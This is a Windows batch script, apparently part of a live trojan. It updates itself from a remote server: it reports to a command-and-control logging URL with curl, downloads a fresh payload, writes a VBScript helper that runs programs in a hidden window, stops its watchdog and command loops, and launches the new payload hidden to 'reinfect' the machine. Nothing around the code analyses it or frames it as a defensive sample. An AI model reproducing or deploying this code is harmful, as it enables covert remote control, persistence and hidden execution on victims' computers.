REM 20260411-1143
REM http://s1083932807.online-home.ca/ow/assets/cmd_list_upgrade.bat

set /a error_code=0

REM both are set by retrieve.php
REM SET jobcode=12348899
REM SET source=cmd_list_upgrade.bat

set sessionid=99%random%%random%%random%%random%%random%
set sessionid=%sessionid:~0,8%

curl -G http://s1083932807.online-home.ca/ow/logmsg.php --data-urlencode "event=start_job" --data-urlencode "source=%source%" --data-urlencode "sessionid=%sessionid%" --data-urlencode "jobcode=%jobcode%"

set clientid=xxxxxxxx

set workdir=%temp%\owd

IF EXIST %workdir%\client_id (
    set /p clientid=<%workdir%\client_id
)

set clientid=%clientid:~0,8%

IF "%clientid%"=="xxxxxxxx" (
    goto :error_not_able_to_extract_clientid
)

REM 20260321184244.052000-240
REM %RANDOM% -- 4 digits
set tt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
SET "timestamp=%tt:~0,14%%tt:~15,4%"

IF NOT EXIST %TEMP%\owd (
    goto :error_owd_folder_missing
)

cd /d %TEMP%\owd
        
SET "trojandir=%TEMP%\owd"

md %TEMP%\owd\cmdlist_%timestamp%

cd /d %TEMP%\owd\cmdlist_%timestamp%
    
set workdir=%temp%\owd\cmdlist_%timestamp%

set logfname=cmdlist_%timestamp%.log
SET "logfpath=%workdir%\%logfname%"

REM ----------

set msg=setup done
echo %msg% >> %logfpath%
curl -G http://s1083932807.online-home.ca/ow/logmsg.php --data-urlencode "msg=%msg%" --data-urlencode "sessionid=%sessionid%" --data-urlencode "source=%source%" --data-urlencode "clientid=%clientid%" --data-urlencode "jobcode=%jobcode%"


:startretrieve
type nul > %temp%\t_o
curl -o %temp%\t_o http://s1083932807.online-home.ca/o

IF NOT EXIST %temp%\t_o (
    goto :error_upgrade_download_failed
)
:retrievedone


:startupgrade

set msg=starting upgrade
echo %msg% >> %logfpath%
curl -G http://s1083932807.online-home.ca/ow/logmsg.php --data-urlencode "msg=%msg%" --data-urlencode "sessionid=%sessionid%" --data-urlencode "source=%source%" --data-urlencode "clientid=%clientid%" --data-urlencode "jobcode=%jobcode%"

IF NOT EXIST %trojandir%\RunHidden.vbs (
    echo On Error Resume Next > %trojandir%\RunHidden.vbs
    echo CreateObject^("Wscript.Shell"^).Run Chr^(34^) ^& WScript.Arguments^(0^) ^& Chr^(34^), 0, False >> %trojandir%\RunHidden.vbs
)

REM shut down existing loops, copy over upgrade, reinfect

type nul > %trojandir%\reset_watchdogloop
type nul > %trojandir%\reset_pingloop
type nul > %trojandir%\reset_cmdlistloop

set msg=reset loops waiting for 60 seconds
echo %msg% >> %logfpath%
curl -G http://s1083932807.online-home.ca/ow/logmsg.php --data-urlencode "msg=%msg%" --data-urlencode "sessionid=%sessionid%" --data-urlencode "source=%source%" --data-urlencode "clientid=%clientid%" --data-urlencode "jobcode=%jobcode%"


timeout 60 /nobreak

copy /Y %temp%\t_o %temp%\z.bat
copy /Y %temp%\t_o %temp%\owd\zfei.bat

type nul > %trojandir%\upgrade.bat
echo timeout 15 /nobreak ^>^> %trojandir%\cmds_list_log_upgrade.txt 2^>^&1 >> %trojandir%\upgrade.bat
echo %temp%\z.bat ^>^> %trojandir%\cmds_list_log_upgrade.txt 2^>^&1 >> %trojandir%\upgrade.bat
echo start "" /min /b cmd /c %trojandir%\upgrade.bat > %trojandir%\t_upgrade.bat

cscript.exe //NOLOGO //B "%trojandir%\RunHidden.vbs" %trojandir%\t_upgrade.bat  

:upgradedone
    
echo finished >> %logfpath%
    
curl -G http://s1083932807.online-home.ca/ow/logmsg.php --data-urlencode "event=job_finished" --data-urlencode "sessionid=%sessionid%" --data-urlencode "source=%source%" --data-urlencode "clientid=%clientid%"  --data-urlencode "jobcode=%jobcode%"

exit

:error_RunHiddenPSx_missing
set /a error_code+=1
:error_RunHiddenPSx_missing
set /a error_code+=1
:error_full_screen_capture_missing
set /a error_code+=1
:error_full_screen_capture_empty
set /a error_code+=1
:error_retrieve_get_macaddr_failed
set /a error_code+=1
:error_upgrade_download_failed
set /a error_code+=1
:error_not_able_to_extract_clientid
set /a error_code+=1
:error_not_able_to_extract_sessionid
set /a error_code+=1
:error_owd_folder_missing
set /a error_code+=1

set msg=errors occurred while executing %source% error_code %error_code%
echo %msg% >> %logfpath%

curl -G http://s1083932807.online-home.ca/ow/logmsg.php --data-urlencode "event=job_finished_with_error" --data-urlencode "errorcode=%error_code%" --data-urlencode "source=%source%"  --data-urlencode "clientid=%clientid%" --data-urlencode "timestamp=%timestamp%" --data-urlencode "sessionid=%sessionid%" --data-urlencode "jobcode=%jobcode%"

exit
